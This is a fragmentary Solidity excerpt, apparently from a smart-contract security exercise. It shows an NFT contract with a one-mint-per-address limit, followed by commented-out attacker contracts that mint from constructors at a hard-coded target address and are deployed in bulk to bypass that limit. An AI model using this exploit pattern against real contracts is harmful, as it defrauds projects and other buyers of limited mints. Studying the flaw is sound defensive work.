...
contract cyrptoBoyz is ERC721A, Ownable, ReentrancyGuard {
    ...
    mapping (address => uint256) minting_count;
    ...
    function mint(uint _amount) external nonReentrant payable {
        ...
        require(_totalMinted() + _amount < 10, 'Supply Denied');
        require(msg.value >= price * _amount, 'Ether Amount Denied');
        require(minting_count[msg.sender] < 1, 'Uzhe Mintili');
        minting_count[msg.sender]+=1;
...
// contract Example  {
//     uint public totalPrice = 0;
//     uint public quantity = 1;
//     Haki_with_mapping public target = Haki_with_mapping(0xEbc37297b93C2fc9e1EFE2Ec0c49F9F6cAa44166);

//     constructor () payable {
//         target.mint{value: totalPrice}(quantity);
//     }

//     function transferNfts(uint256[] calldata _tokensIds, address _to) public {
//         for (uint i; i < _tokensIds.length; i++) {
//             target.transferFrom(address(this), _to, _tokensIds[i]);
//         }
//     }
...
//     uint256 public contractEther = 1;
    
//     constructor() {
//         owner = address(msg.sender);
//     }

//     function deployContracts(uint256 _amount) public payable {
//         for (uint i; i < _amount; i++) {
//             Example newContract = new Example{value: contractEther}();
//         }
//     }
// }
